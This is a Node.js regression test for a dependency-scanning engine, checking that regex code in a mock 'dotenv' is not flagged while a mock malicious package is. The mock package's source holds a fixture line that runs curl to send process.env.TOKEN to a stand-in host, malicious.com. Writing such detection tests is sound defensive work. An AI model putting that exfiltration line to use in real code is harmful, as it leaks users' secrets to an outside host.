import { test } from 'node:test';
import assert from 'node:assert';
import path from 'node:path';
import fs from 'node:fs';
import { runScanner } from '../src/core/engine.js';

test('Heuristic False Positive Regression', async (t) => {
  const tmpDir = path.join(process.cwd(), 'tmp-fp-test');
  
  if (fs.existsSync(tmpDir)) {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
  fs.mkdirSync(tmpDir, { recursive: true });
  fs.mkdirSync(path.join(tmpDir, 'node_modules/dotenv'), { recursive: true });
  fs.mkdirSync(path.join(tmpDir, 'node_modules/malicious-pkg'), { recursive: true });

  // 1. Root package.json
  const rootPackage = {
    name: 'fp-test-project',
    dependencies: {
      'dotenv': '16.0.0',
      'malicious-pkg': '1.0.0'
    }
  };
  fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify(rootPackage));

  // 2. Dotenv (False Positive Case)
  const dotenvSource = `
    const RE_INI_KEY_VAL = /^\\s*([^\\s=]+)\\s*=\\s*(.*)?\\s*$/;
    const match = RE_INI_KEY_VAL.exec(line); // Should NOT be flagged
    if (/[a-z]/.exec(str)) return true; // Should NOT be flagged
  `;
  fs.writeFileSync(path.join(tmpDir, 'node_modules/dotenv/index.js'), dotenvSource);
  fs.writeFileSync(path.join(tmpDir, 'node_modules/dotenv/package.json'), JSON.stringify({ name: 'dotenv', version: '16.0.0' }));

  // 3. Malicious (True Positive Case)
  const malSource = `
    const { exec } = require('child_process');
    exec('curl http://malicious.com/steal?data=' + process.env.TOKEN); // Should be flagged
  `;
  fs.writeFileSync(path.join(tmpDir, 'node_modules/malicious-pkg/index.js'), malSource);
  fs.writeFileSync(path.join(tmpDir, 'node_modules/malicious-pkg/package.json'), JSON.stringify({ name: 'malicious-pkg', version: '1.0.0' }));

  await t.test('should NOT flag dotenv regex usage but SHOULD flag malicious exec', async () => {
    const report = await runScanner(tmpDir);

    const dotenvFinding = report.findings.find(f => f.dependencyName === 'dotenv');
    const malFinding = report.findings.find(f => f.dependencyName === 'malicious-pkg');

    // Dotenv should have no CRITICAL source-sensitive-apis matches
    if (dotenvFinding) {
      const sourceMatches = dotenvFinding.matches.filter(m => m.ruleId === 'source-sensitive-apis');
      assert.strictEqual(sourceMatches.length, 0, 'dotenv should have 0 sensitive API findings');
    }

    // Malicious should have CRITICAL match
    assert.ok(malFinding, 'malicious-pkg should be flagged');
    const malSourceMatch = malFinding.matches.find(m => m.ruleId === 'source-sensitive-apis');
    assert.ok(malSourceMatch, 'malicious-pkg should have source-sensitive-apis match');
    assert.ok(malFinding.matches.some(m => m.content?.includes('exec(')), 'Should find the exec() call');
  });

  // Cleanup
  fs.rmSync(tmpDir, { recursive: true, force: true });
});
